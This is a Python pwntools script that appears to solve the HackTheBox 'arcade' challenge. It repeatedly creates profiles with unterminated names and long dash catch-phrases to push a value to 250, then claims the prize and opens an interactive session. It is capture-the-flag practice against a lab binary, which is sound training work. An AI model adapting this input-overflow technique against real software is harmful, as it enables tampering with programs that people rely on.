#!/usr/bin/python
from pwn import *

target = process("./arcade")
#target = remote("docker.hackthebox.eu", 30630)

target.recvuntil("> ")
target.sendline("2") 

# Create profile (0 -> 120)
target.recvuntil("> ")
target.sendline("1")
target.recv()
target.send("Super-") # No envia salto de linea
target.recv() # Select increased attribute...
target.sendline("1")
target.recv() # How many Health points you want to add? Max 120 pts!
target.sendline("120")
target.recv() # Insert a catch-phrase for your character!
target.send("-"*120)

# Create profile (120 -> 240)
target.recvuntil("> ")
target.sendline("1")
target.recv()
target.send("Super-") # No envia salto de linea
target.recv() # Select increased attribute...
target.sendline("1")
target.recv() # How many Health points you want to add? Max 120 pts!
target.sendline("120")
target.recv() # Insert a catch-phrase for your character!
target.send("-"*120)

# Create profile (240 -> 250)
target.recvuntil("> ")
target.sendline("1")
target.recv()
target.send("Super-") # No envia salto de linea
target.recv() # Select increased attribute...
target.sendline("1")
target.recv() # How many Health points you want to add? Max 120 pts!
target.sendline("120")
target.recv() # Insert a catch-phrase for your character!
target.send("-"*10)

# Claim prize
target.recvuntil("> ")
target.sendline("3")

target.interactive()
